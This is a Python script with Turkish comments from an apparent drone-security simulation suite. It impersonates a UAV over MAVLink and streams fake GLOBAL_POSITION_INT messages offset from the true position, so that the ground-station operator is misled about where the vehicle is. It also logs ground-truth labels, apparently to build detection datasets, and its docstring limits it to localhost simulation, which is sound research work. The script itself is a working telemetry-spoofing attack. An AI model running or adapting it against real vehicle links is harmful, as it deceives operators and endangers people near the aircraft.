#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""fake_telemetry.py — SAHTE TELEMETRİ saldırısı (fake_telemetry).

Ne yapar: Yer istasyonuna, aracın GERÇEK konumundan sapmış sahte
GLOBAL_POSITION_INT mesajları gönderir. Amaç, operatörü aracın yeri
konusunda yanıltmaktır (meşru araç gibi görünen sahte telemetri akışı).

GÜVENLİK: Yalnızca 127.0.0.1 hedefine bağlanır. Yalnızca simülasyon içindir.

Kullanım:
    python betikler/saldirilar/fake_telemetry.py --ucus F210_fake_telemetry \
        --sure 30 --baslangic-gecikme 50 --sapma-m 500
"""

from __future__ import annotations

import time

import saldiri_temel as st
import ortak


def main() -> int:
    ap = st.temel_arg_parser(__doc__)
    ap.add_argument("--hiz", type=float, default=5.0, help="Saniyedeki sahte telemetri sayısı.")
    ap.add_argument("--sapma-m", type=float, default=500.0, help="Gerçek konumdan sapma (metre).")
    args = ap.parse_args()

    cfg = ortak.config_oku()
    # Aracı taklit et: araç sysid'i (genelde 1).
    baglanti = st.gonderen_kur(cfg, source_system=1, source_component=1)
    st.baslangic_gecikmesi_bekle(args.baslangic_gecikme)

    ortak.log(f"Sahte telemetri başlıyor (~{args.sapma_m} m sapma).", "UYARI")
    start_ns = ortak.simdi_ns()
    attacker_addr = None
    aralik = 1.0 / max(args.hiz, 0.1)

    # CMAC varsayılan başlangıcı (yaklaşık); sapmayı buna ekleriz.
    temel_lat, temel_lon = -35.363261, 149.165230
    # ~metre -> derece (kabaca): 1 derece enlem ~ 111320 m
    sapma_derece = args.sapma_m / 111320.0

    son = time.time() + args.sure
    gonderilen = 0
    while time.time() < son:
        lat = int((temel_lat + sapma_derece) * 1e7)
        lon = int((temel_lon + sapma_derece) * 1e7)
        baglanti.mav.global_position_int_send(
            int(time.time() * 1e3) & 0xFFFFFFFF,  # time_boot_ms
            lat, lon,
            100000,  # alt (mm)
            90000,   # relative_alt (mm)
            0, 0, 0, # vx, vy, vz
            65535,   # hdg
        )
        gonderilen += 1
        if attacker_addr is None:
            attacker_addr = st.attacker_addr_al(baglanti, cfg)
        time.sleep(aralik)

    end_ns = ortak.simdi_ns()
    ortak.log(f"Saldırı bitti. {gonderilen} sahte telemetri gönderildi.", "BILGI")

    st.ground_truth_yaz(
        args.ucus, "fake_telemetry", start_ns, end_ns,
        attacker_addr or f"{cfg.get('host')}:?",
        {"sapma_m": args.sapma_m, "hiz": args.hiz, "gonderilen": gonderilen}, cfg,
    )
    baglanti.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
